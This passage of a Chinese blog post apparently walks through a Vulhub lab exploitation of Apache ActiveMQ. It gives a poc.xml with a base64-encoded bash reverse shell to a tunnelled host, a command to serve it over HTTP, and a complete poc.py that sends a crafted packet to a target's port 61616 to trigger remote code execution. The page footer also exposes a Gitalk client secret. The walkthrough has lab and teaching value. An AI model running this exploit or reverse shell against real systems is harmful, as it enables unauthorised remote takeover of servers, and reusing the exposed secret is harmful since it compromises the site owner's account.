+<p>&lt;value&gt;{echo,YYmFzaCAtaSA+JiAvZGV2L3RjcC8zLnRjcC52aXAuY3BvbGFyLmNuLzEwNzkyIDA+JjE&#x3D;}|{base64,-d}|{bash,-i}&lt;&#x2F;value&gt; &lt;!– base64(bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;3.tcp.vip.cpolar.cn:10792 0&gt;&amp;1) 这俩这个地址是我20000端口进行的外网映射，就是反弹shell连接前面ip端口，然后我监听20000端口就能得到数据–&gt;</p>
+<p>&lt;&#x2F;list&gt;</p>
+<p>&lt;&#x2F;constructor-arg&gt;</p>
+<p>&lt;&#x2F;bean&gt;</p>
+<p>&lt;&#x2F;beans&gt;</p>
+<p>启动一个HTTP发连接服务器，其中包含我们的poc.xml:</p>
+<p>python3 -m http.server 22</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//19.webp" alt="19"></p>
+<p>这里我所有的终端都是在这个文件夹下的</p>
+<p>我做了内网穿透，22号端口已经映射到外网了</p>
+<p>监听我的20000端口</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//20.webp" alt="20"></p>
+<p>然后，执行poc.py（下面是代码命名为poc.py），传入的三个参数分别是目标服务器地址、端口、以及包含poc.xml的反连平台URL：</p>
+<p>import io</p>
+<p>import socket</p>
+<p>import sys</p>
+<p>def main(ip, port, xml):</p>
+<p>classname &#x3D; “org.springframework.context.support.ClassPathXmlApplicationContext”</p>
+<p>socket_obj &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>socket_obj.connect((ip, port))</p>
+<p>with socket_obj:</p>
+<p>out &#x3D; socket_obj.makefile(‘wb’)</p>
+<p># out &#x3D; io.BytesIO() # 创建一个内存中的二进制流</p>
+<p>out.write(int(32).to_bytes(4, ‘big’))</p>
+<p>out.write(bytes([31]))</p>
+<p>out.write(int(1).to_bytes(4, ‘big’))</p>
+<p>out.write(bool(True).to_bytes(1, ‘big’))</p>
+<p>out.write(int(1).to_bytes(4, ‘big’))</p>
+<p>out.write(bool(True).to_bytes(1, ‘big’))</p>
+<p>out.write(bool(True).to_bytes(1, ‘big’))</p>
+<p>out.write(len(classname).to_bytes(2, ‘big’))</p>
+<p>out.write(classname.encode(‘utf-8’))</p>
+<p>out.write(bool(True).to_bytes(1, ‘big’))</p>
+<p>out.write(len(xml).to_bytes(2, ‘big’))</p>
+<p>out.write(xml.encode(‘utf-8’))</p>
+<p># print(list(out.getvalue()))</p>
+<p>out.flush()</p>
+<p>out.close()</p>
+<p>if __name__ &#x3D;&#x3D; “__main__“:</p>
+<p>if len(sys.argv) !&#x3D; 4:</p>
+<p>print(“Please specify the target and port and poc.xml: python3 poc.py 8.130.129.187 61616 “ &#x2F;&#x2F;这个是受害机</p>
+<p>“<a target="_blank" rel="noopener" href="http://2.tcp.vip.cpolar.cn:10544/poc.xml">http://2.tcp.vip.cpolar.cn:10544/poc.xml</a>“) 这个是我22号端口映射的外网地址，用来给受害机下载.xml</p>
+<p>exit(-1)</p>
+<p>main(sys.argv[1], int(sys.argv[2]), sys.argv[3])</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//21.webp" alt="22"></p>
+<p>现在输入这条命令</p>
+<p>python .&#x2F;poc.py 8.130.129.187 61616 <a target="_blank" rel="noopener" href="http://2.tcp.vip.cpolar.cn:10544/poc.xml">http://2.tcp.vip.cpolar.cn:10544/poc.xml</a></p>
+<p>传入的三个参数分别是目标服务器地址、端口、以及包含poc.xml的反连平台URL</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//22.webp" alt="22"></p>
+<p>连上了</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulhub-2-adminer/">Vulhub-2.Adminer</a>
+            
+            
+            <a class="next" rel="next" href="../dc-9/">DC-9</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
